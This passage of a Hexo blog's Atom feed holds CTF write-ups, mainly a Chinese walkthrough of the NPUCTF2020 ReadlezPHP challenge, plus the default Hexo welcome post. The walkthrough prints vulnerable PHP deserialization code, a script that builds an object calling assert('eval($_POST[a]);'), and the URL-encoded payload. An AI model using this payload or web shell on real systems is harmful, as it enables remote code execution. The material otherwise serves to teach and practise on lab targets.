&#39;Po&#39;, &#39;At&#39;, &#39;Rn&#39;, </span><br><span class="line">                  &#39;Fr&#39;, &#39;Ra&#39;, &#39;Ac&#39;, &#39;Th&#39;, &#39;Pa&#39;, &#39;U&#39;, &#39;Np&#39;, &#39;Pu&#39;, &#39;Am&#39;, &#39;Cm&#39;, &#39;Bk&#39;, &#39;Cf&#39;, &#39;Es&#39;, &#39;Fm&#39;,&#39;Md&#39;, &#39;No&#39;, &#39;Lr&#39;,</span><br><span class="line">                  &#39;Rf&#39;, &#39;Db&#39;, &#39;Sg&#39;, &#39;Bh&#39;, &#39;Hs&#39;, &#39;Mt&#39;, &#39;Ds&#39;, &#39;Rg&#39;, &#39;Cn&#39;, &#39;Nh&#39;, &#39;Fl&#39;, &#39;Mc&#39;, &#39;Lv&#39;, &#39;Ts&#39;, &#39;Og&#39;, &#39;Uue&#39;)</span><br><span class="line">for symbol in elements:</span><br><span class="line">    link &#x3D; &quot;http:&#x2F;&#x2F;bb55496d-1807-46ab-96ae-138ad4583386.node3.buuoj.cn&#x2F;&quot; + symbol + &quot;.php&quot;</span><br><span class="line">    response &#x3D; req.get(link)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(response.text, end&#x3D;&#39;&#39;)</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]phpweb&lt;/h2&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF[NPUCTF2020]web WP</title>
    <link href="http://yoursite.com/2020/05/28/Kath4rs1s/"/>
    <id>http://yoursite.com/2020/05/28/Kath4rs1s/</id>
    <published>2020-05-28T06:56:49.914Z</published>
    <updated>2020-07-20T10:32:51.733Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="BUUCTF-NPUCTF2020"><a href="#BUUCTF-NPUCTF2020" class="headerlink" title="BUUCTF[NPUCTF2020]"></a>BUUCTF[NPUCTF2020]</h1><p>上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up</p><a id="more"></a><h2 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h2><p>这是一道简单的反序列化的题<br>进入页面没什么发现，只有一个跳转到西工大官网的链接，然后查看源码，发现一个隐藏的a标签</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423190116592-758599765.png" alt=""></p><p>然后进入页面，看到了源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure><p>这段代码的关键在于当执行反序列化函数的时候，调用__destruct函数执行<em>echo $b($a)</em>，我们便可以利用这个函数执行任意我们想执行的函数，从而达到getshell的目的。<br>接下来便是写php脚本构造序列化了，期间试了很多函数比如<em>system</em>等等都被禁用了，但是我们还可以用<strong>assert</strong>这个函数。<br>首先我们来了解一下断言（assert）这个函数，参考大佬的文章<a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">PHP assert 和 eval</a></p><blockquote><p>assert   判断一个表达式是否成立。返回true or false；</p></blockquote><p>我们来看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;123&quot;;</span><br><span class="line">echo assert(is_numeric($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码输出的结果是：<br><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423195608051-314750544.png" alt=""></p><p>简言之就是<em>assert()</em>可以将整个字符串参数当作php参数执行，而类似的<em>eval()</em>函数是执行合法的php代码。<br>接下来放出序列化的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line">$c-&gt;b &#x3D; &#39;assert&#39;;</span><br><span class="line">$c-&gt;a &#x3D; &#39;eval($_POST[a]);&#39;;</span><br><span class="line">echo urlencode(serialize($c)).&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里除了用<em>assert()</em>之外，还可以用<strong>call_user_func()</strong>函数</p><blockquote><p>call_user_func — 把第一个参数作为回调函数调用</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function barber($type)&#123;</span><br><span class="line">    echo &quot;you wanted a $type haircut, no problem\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(&#39;barber&#39;,&#39;mushroom&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;返回内容如下：</span><br><span class="line">&#x2F;&#x2F;you wanted a mushroom haircut, no problem</span><br></pre></td></tr></table></figure><p>只要构造出<strong>call_user_func(phpinfo)</strong>就好了</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data&#x3D;O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></pre></td></tr></table></figure><p>成功得出结果：</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200124220-346066862.png" alt=""></p><p>flag就在phpinfo中</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200413520-1487498985.png" alt=""><br>得到flag！</p><p><strong>未完待续···</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;BUUCTF-NPUCTF2020&quot;&gt;&lt;a href=&quot;#BUUCTF-NPUCTF2020&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF[NPUCTF2020]&quot;&gt;&lt;/a&gt;BUUCTF[NPUCTF2020]&lt;/h1&gt;&lt;p&gt;上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/05/28/hello-world/"/>
    <id>http://yoursite.com/2020/05/28/hello-world/</id>
    <published>2020-05-27T18:22:14.688Z</published>
    <updated>2020-07-20T10:31:56.764Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
